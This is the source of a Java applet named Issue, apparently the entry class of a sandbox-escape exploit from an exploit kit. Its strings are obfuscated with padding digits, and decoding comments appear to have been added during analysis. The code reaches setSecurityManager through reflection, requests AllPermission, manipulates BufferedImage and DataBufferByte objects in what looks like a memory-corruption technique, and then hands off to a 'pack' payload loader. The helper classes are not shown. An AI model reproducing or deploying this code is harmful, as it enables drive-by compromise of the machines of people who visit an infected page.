import java.applet.Applet;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;

public class Issue
        extends Applet {
    private static final String jse = csfn("986j56a4v35a.3s5e3c6u4r534it6y7.3P4e5r6m8i6s4s3i5o6n7s8"); // java.security.Permissions
    private static final String jseA = csfn("23j5a64v6a.5s2e4c5u55r7i34ty.3A4l5l3645P6er46566m6i3s3645si6o3n2"); // java.security.AllPermission
    private boolean _is64 = System.getProperty(csfn("3o5s.6a2r5c5h2"), "").contains("64"); // os.arch
    static boolean _isWin = isWin();

    public void init() {
        try {
            for (int i = iCh(111); i < iCh(116); i++) {

                try {
                    myJob();
                    if (!isOk()) {
                        break;
                    }
                } catch (Throwable throwable) {
                }
            }

            if (isOk())
                System.exit(0);
            Resp resp = new Resp(csfn("234p34a55445c43654k632434234235")); // pack
        } catch (Exception exception) {

            System.exit(0);
        }
    }

    public static boolean isOk() {
        return (info2.getSM() != null);
    }

    public static boolean isWin() {
        String str = System.getProperty("os.name").toLowerCase();
        return (str.indexOf(csfn("456457w6734345i5645n4743457345")) >= 0); // win
    }

    private int myJob() throws Throwable {
        try {
            String str = csfn("64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222"); // setSecurityManager
            Class clazz = info1.syscla();
            Object[] arrayOfObject1 = new Object[iCh(1)];
            Object object1 = stac.stacO(clazz, str, arrayOfObject1);

            DataBufferByte dataBufferByte = new DataBufferByte(16);
            int[] arrayOfInt = new int[iCh(8)];
            Object[] arrayOfObject2 = new Object[iCh(7)];
            arrayOfObject2[iCh(2)] = stac.stacO(clazz, str, arrayOfObject1);
            arrayOfObject2[iCh(4)] = stac.stac9(arrayOfObject2[iCh(2)]);

            Object object2 = info2.levelUp(jseA, jse);

            arrayOfObject2[3] = info2.acc(object2);

            int i = iCh(arrayOfInt.length);

            BufferedImage bufferedImage1 = new BufferedImage(iCh(4), 1, 2);

            stac.turk(bufferedImage1);

            Object object3 = info1.purk(this._is64, dataBufferByte);
            BufferedImage bufferedImage2 = info1.furk(object3);

            stac.atfo(bufferedImage1, bufferedImage2);

            int j = iCh(arrayOfInt.length);
            if (j == i) {
                return 1;
            }
            if (Resp.aLoop(i, arrayOfObject2, arrayOfInt) != 0) {

                try {
                    stac.stac1(arrayOfObject2[2]);
                } catch (Exception exception) {
                }
            }
        } catch (Exception exception) {
        }
        return 0;
    }

    public static int iCh(int paramInt) {
        int i = "ggff".length();
        i = i / 4 * paramInt;
        return i;
    }

    static String imgExt(String paramString) {
        return csfn("777j7a7v7a7.7a7w7t7.77im727a7g7e7.7777") + paramString; // java.awt.image.
    }

    public static Object getMd(String paramString1, String paramString2, Object paramObject, Class[] paramArrayOfClass,
            Object[] paramArrayOfObject) throws Exception {
        return info2.pInvoke(info2.getCl(paramString1).getMethod(paramString2, paramArrayOfClass), paramObject,
                paramArrayOfObject);
    }

    public static Object getCon(String paramString, Class[] paramArrayOfClass, Object[] paramArrayOfObject)
            throws Exception {
        return info2.getCl(paramString).getConstructor(paramArrayOfClass).newInstance(paramArrayOfObject);
    }

    public static String csfn(String paramString) {
        // Use this python oneliner to decode the string: import re;re.sub(r"\d", "", "777j7a7v7a7.7a7w7t7.77im727a7g7e7.7777")
        String str = "";
        for (byte b = 0; b < paramString.length(); b++) {

            if (paramString.charAt(b) > '9' || paramString.charAt(b) < '0') {
                str = str + paramString.charAt(b);
            }
        }
        return str;
    }
}
